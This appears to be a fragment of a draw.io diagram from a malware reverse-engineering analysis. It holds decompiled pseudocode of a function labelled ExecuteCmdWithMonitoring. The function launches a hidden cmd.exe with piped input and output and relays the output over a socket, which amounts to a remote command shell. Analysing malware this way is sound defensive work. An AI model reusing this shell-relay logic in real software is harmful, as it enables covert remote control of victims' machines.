        <UserObject label="int __stdcall ExecuteCmdWithMonitoring(const char *threadParamsInput)&#xa;{&#xa;  LPBYTE numBytesRead; // [esp+8h] [ebp-128Ch] BYREF&#xa;  wchar_t cmdExePath[10]; // [esp+Ch] [ebp-1288h] BYREF&#xa;  int createdProcessCheck; // [esp+20h] [ebp-1274h]&#xa;  int isProcessAlive; // [esp+24h] [ebp-1270h]&#xa;  int readFileReturnCheck; // [esp+28h] [ebp-126Ch]&#xa;  _SECURITY_ATTRIBUTES pipeSecurityAttributes; // [esp+2Ch] [ebp-1268h] BYREF&#xa;  _STARTUPINFOW startInfo; // [esp+38h] [ebp-125Ch] BYREF&#xa;  struct _PROCESS_INFORMATION processInfo; // [esp+7Ch] [ebp-1218h] BYREF&#xa;  WCHAR sysDirectoryBuffer[260]; // [esp+8Ch] [ebp-1208h] BYREF&#xa;  char fileReadStreamBuffer[4093]; // [esp+294h] [ebp-1000h] BYREF&#xa;  __int16 readStreamBufferEnd; // [esp+1291h] [ebp-3h]&#xa;  char bufferEndFlag; // [esp+1293h] [ebp-1h]&#xa;&#xa;  pipeSecurityAttributes.nLength = 12;&#xa;  pipeSecurityAttributes.lpSecurityDescriptor = 0;&#xa;  pipeSecurityAttributes.bInheritHandle = 1;&#xa;  CreatePipe((PHANDLE)&amp;hFile, (PHANDLE)&amp;dword_4075B4, &amp;pipeSecurityAttributes, 0);&#xa;  GetStartupInfoW(&amp;startInfo);&#xa;  startInfo.hStdError = *(HANDLE *)&amp;dword_4075B4.wYear;&#xa;  startInfo.hStdOutput = *(HANDLE *)&amp;dword_4075B4.wYear;&#xa;  cmdExePath[9] = 0;&#xa;  memset(sysDirectoryBuffer, 0, sizeof(sysDirectoryBuffer));&#xa;  createdProcessCheck = 0;&#xa;  isProcessAlive = 0;&#xa;  startInfo.dwFlags = 257;&#xa;  readFileReturnCheck = 0;&#xa;  startInfo.hStdInput = *(HANDLE *)&amp;hObject.wYear;&#xa;  startInfo.wShowWindow = 0;&#xa;  wcscpy(cmdExePath, L&quot;\\cmd.exe&quot;);&#xa;  GetSystemDirectoryW(sysDirectoryBuffer, 0x208u);&#xa;  wcscat(sysDirectoryBuffer, cmdExePath);&#xa;  if ( !CreateProcessW(sysDirectoryBuffer, 0, 0, 0, 1, 0, 0, 0, &amp;startInfo, &amp;processInfo) )&#xa;    return -1;&#xa;  while ( 1 )&#xa;  {&#xa;    memset(fileReadStreamBuffer, 0, sizeof(fileReadStreamBuffer));&#xa;    readStreamBufferEnd = 0;&#xa;    bufferEndFlag = 0;&#xa;    ReadFile(*(HANDLE *)&amp;hFile.wYear, fileReadStreamBuffer, 0xFFFu, (LPDWORD)&amp;numBytesRead, 0);&#xa;    secureDataTransmission(&#xa;      (int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dataBuffer,&#xa;      fileReadStreamBuffer,&#xa;      (unsigned int)numBytesRead,&#xa;      8,&#xa;      (int)socketFlag,&#xa;      threadParamsInput);&#xa;    if ( !strncmp(fileReadStreamBuffer, Str2, 6u) )&#xa;      break;&#xa;    Sleep(0x32u);&#xa;  }&#xa;  CloseHandle(*(HANDLE *)&amp;hObject.wYear);&#xa;  CloseHandle(*(HANDLE *)&amp;dword_4075B4.wYear);&#xa;  CloseHandle(*(HANDLE *)&amp;hWritePipe.wYear);&#xa;  CloseHandle(*(HANDLE *)&amp;hFile.wYear);&#xa;  return 0;&#xa;}" link="int __stdcall ExecuteCmdWithMonitoring(const char *threadParamsInput)&#xa;{&#xa;  LPBYTE numBytesRead; // [esp+8h] [ebp-128Ch] BYREF&#xa;  wchar_t cmdExePath[10]; // [esp+Ch] [ebp-1288h] BYREF&#xa;  int createdProcessCheck; // [esp+20h] [ebp-1274h]&#xa;  int isProcessAlive; // [esp+24h] [ebp-1270h]&#xa;  int readFileReturnCheck; // [esp+28h] [ebp-126Ch]&#xa;  _SECURITY_ATTRIBUTES pipeSecurityAttributes; // [esp+2Ch] [ebp-1268h] BYREF&#xa;  _STARTUPINFOW startInfo; // [esp+38h] [ebp-125Ch] BYREF&#xa;  struct _PROCESS_INFORMATION processInfo; // [esp+7Ch] [ebp-1218h] BYREF&#xa;  WCHAR sysDirectoryBuffer[260]; // [esp+8Ch] [ebp-1208h] BYREF&#xa;  char fileReadStreamBuffer[4093]; // [esp+294h] [ebp-1000h] BYREF&#xa;  __int16 readStreamBufferEnd; // [esp+1291h] [ebp-3h]&#xa;  char bufferEndFlag; // [esp+1293h] [ebp-1h]&#xa;&#xa;  pipeSecurityAttributes.nLength = 12;&#xa;  pipeSecurityAttributes.lpSecurityDescriptor = 0;&#xa;  pipeSecurityAttributes.bInheritHandle = 1;&#xa;  CreatePipe((PHANDLE)&amp;hFile, (PHANDLE)&amp;dword_4075B4, &amp;pipeSecurityAttributes, 0);&#xa;  GetStartupInfoW(&amp;startInfo);&#xa;  startInfo.hStdError = *(HANDLE *)&amp;dword_4075B4.wYear;&#xa;  startInfo.hStdOutput = *(HANDLE *)&amp;dword_4075B4.wYear;&#xa;  cmdExePath[9] = 0;&#xa;  memset(sysDirectoryBuffer, 0, sizeof(sysDirectoryBuffer));&#xa;  createdProcessCheck = 0;&#xa;  isProcessAlive = 0;&#xa;  startInfo.dwFlags = 257;&#xa;  readFileReturnCheck = 0;&#xa;  startInfo.hStdInput = *(HANDLE *)&amp;hObject.wYear;&#xa;  startInfo.wShowWindow = 0;&#xa;  wcscpy(cmdExePath, L&quot;\\cmd.exe&quot;);&#xa;  GetSystemDirectoryW(sysDirectoryBuffer, 0x208u);&#xa;  wcscat(sysDirectoryBuffer, cmdExePath);&#xa;  if ( !CreateProcessW(sysDirectoryBuffer, 0, 0, 0, 1, 0, 0, 0, &amp;startInfo, &amp;processInfo) )&#xa;    return -1;&#xa;  while ( 1 )&#xa;  {&#xa;    memset(fileReadStreamBuffer, 0, sizeof(fileReadStreamBuffer));&#xa;    readStreamBufferEnd = 0;&#xa;    bufferEndFlag = 0;&#xa;    ReadFile(*(HANDLE *)&amp;hFile.wYear, fileReadStreamBuffer, 0xFFFu, (LPDWORD)&amp;numBytesRead, 0);&#xa;    secureDataTransmission(&#xa;      (int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dataBuffer,&#xa;      fileReadStreamBuffer,&#xa;      (unsigned int)numBytesRead,&#xa;      8,&#xa;      (int)socketFlag,&#xa;      threadParamsInput);&#xa;    if ( !strncmp(fileReadStreamBuffer, Str2, 6u) )&#xa;      break;&#xa;    Sleep(0x32u);&#xa;  }&#xa;  CloseHandle(*(HANDLE *)&amp;hObject.wYear);&#xa;  CloseHandle(*(HANDLE *)&amp;dword_4075B4.wYear);&#xa;  CloseHandle(*(HANDLE *)&amp;hWritePipe.wYear);&#xa;  CloseHandle(*(HANDLE *)&amp;hFile.wYear);&#xa;  return 0;&#xa;}" id="M72Y2Jye1D7dT9Ai017H-54">
          <mxCell style="text;whiteSpace=wrap;" vertex="1" parent="1">
            <mxGeometry x="-60" y="5970" width="560" height="870" as="geometry" />
          </mxCell>
        </UserObject>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-56" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 9.4.1: sub_4021B0() (ExecuteCmdWithMonitoring)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-30" y="5880" width="530" height="70" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
